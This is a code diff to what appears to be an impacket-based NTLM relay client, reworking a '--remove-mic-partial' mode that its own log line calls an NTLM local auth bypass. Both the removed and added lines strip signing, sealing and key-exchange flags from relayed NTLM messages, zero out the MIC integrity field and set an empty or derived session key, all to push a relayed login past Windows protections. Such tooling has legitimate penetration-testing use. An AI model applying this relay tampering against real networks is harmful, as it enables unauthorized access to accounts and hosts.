@@ -332,11 +332,7 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
         elif self.serverConfig.remove_mic_partial:
             LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
-            # Strategy: Use weaker/legacy flags to bypass modern security checks
-            # Remove modern security flags and add legacy/weak flags
-            from impacket.ntlm import NTLMSSP_NEGOTIATE_LM_KEY, NTLMSSP_REQUEST_NON_NT_SESSION_KEY, \
-                NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
-
+            # Only remove SIGN/SEAL/KEY_EXCH flags - don't add legacy flags
             # Remove strong auth/signing flags
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
@@ -348,20 +344,6 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
-            # Remove Extended Session Security to force older, simpler auth path
-            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY == NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
-                LOG.debug('[SMB] sendNegotiate: Removed Extended Session Security')
-
-            # Add weak/legacy flags to request simpler auth
-            # LM_KEY: Use Lan Manager key (weaker, older)
-            if not (negoMessage['flags'] & NTLMSSP_NEGOTIATE_LM_KEY):
-                negoMessage['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
-                LOG.debug('[SMB] sendNegotiate: Added LM_KEY flag for legacy auth')
-            # REQUEST_NON_NT_SESSION_KEY: Request simpler session key
-            if not (negoMessage['flags'] & NTLMSSP_REQUEST_NON_NT_SESSION_KEY):
-                negoMessage['flags'] |= NTLMSSP_REQUEST_NON_NT_SESSION_KEY
-                LOG.debug('[SMB] sendNegotiate: Added NON_NT_SESSION_KEY flag')
 
         LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
@@ -677,10 +659,7 @@ class SMBRelayClient(ProtocolClient):
             original_flags = authMessage['flags']
             LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
 
-            # Use weak/legacy flags strategy
-            from impacket.ntlm import NTLMSSP_NEGOTIATE_LM_KEY, NTLMSSP_REQUEST_NON_NT_SESSION_KEY, \
-                NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
-
+            # Only remove SIGN/SEAL/KEY_EXCH/VERSION flags - don't add legacy flags
             # Remove strong auth/signing flags
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
@@ -694,24 +673,12 @@ class SMBRelayClient(ProtocolClient):
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
                 authMessage['Version'] = b''
                 authMessage['VersionLen'] = 0
-            # Remove Extended Session Security
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY == NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
-                LOG.debug('[SMB] sendAuth: Removed Extended Session Security')
-
-            # Add weak/legacy flags
-            if not (authMessage['flags'] & NTLMSSP_NEGOTIATE_LM_KEY):
-                authMessage['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
-                LOG.debug('[SMB] sendAuth: Added LM_KEY flag')
-            if not (authMessage['flags'] & NTLMSSP_REQUEST_NON_NT_SESSION_KEY):
-                authMessage['flags'] |= NTLMSSP_REQUEST_NON_NT_SESSION_KEY
-                LOG.debug('[SMB] sendAuth: Added NON_NT_SESSION_KEY flag')
 
             # Strip MIC field (zero it out)
             authMessage['MIC'] = b'\x00' * 16
             LOG.debug('[SMB] sendAuth: Stripped MIC field (zeroed out)')
 
-            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, using legacy/weak flags' % authMessage['flags'])
+            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x' % authMessage['flags'])
 
             # Try to extract/derive session key for SMB operations
             # Log what we have to work with
@@ -798,32 +765,10 @@ class SMBRelayClient(ProtocolClient):
             self.session._SMBConnection.set_session_key(signingKey)
         else:
             LOG.debug('[SMB] sendAuth: No signing key available, session will operate without signing')
-            # For --remove-mic-partial with NON_NT_SESSION_KEY flag, use cached or calculate session key
+            # For --remove-mic-partial, use empty session key (no signing)
             if self.serverConfig.remove_mic_partial:
-                # Try to get cached session key from previous LDAP/RPC relay
-                from impacket.ntlm import LMOWFv1, NTLMAuthChallengeResponse
-
-                # Parse username/domain from auth message to build cache key
-                try:
-                    auth_msg = NTLMAuthChallengeResponse()
-                    auth_msg.fromString(authData)
-                    username = auth_msg['user_name'].decode('utf-16le') if auth_msg['user_name'] else ''
-                    domain = auth_msg['domain_name'].decode('utf-16le') if auth_msg['domain_name'] else ''
-                    cache_key = f"{domain}\\{username}@{self.targetHost}".lower()
-
-                    if cache_key in self.serverConfig.session_key_cache:
-                        calculated_key = self.serverConfig.session_key_cache[cache_key]
-                        LOG.info('[SMB] sendAuth: Using CACHED session key from previous relay: %s' % calculated_key.hex())
-                    else:
-                        # With NTLMSSP_REQUEST_NON_NT_SESSION_KEY and empty credentials (LOCAL_CALL),
-                        # the session key is: LMOWFv1('', '')[:8] + b'\x00'*8
-                        calculated_key = LMOWFv1('', '')[:8] + b'\x00'*8
-                        LOG.debug('[SMB] sendAuth: Calculated session key for NON_NT_SESSION_KEY with empty credentials: %s' % calculated_key.hex())
-                except Exception as e:
-                    LOG.debug('[SMB] sendAuth: Error checking cache, using calculated key: %s' % str(e))
-                    calculated_key = LMOWFv1('', '')[:8] + b'\x00'*8
-
-                self.session._SMBConnection.set_session_key(calculated_key)
+                LOG.debug('[SMB] sendAuth: Setting empty session key for --remove-mic-partial mode')
+                self.session._SMBConnection.set_session_key(b'')
 
         return token, errorCode
 
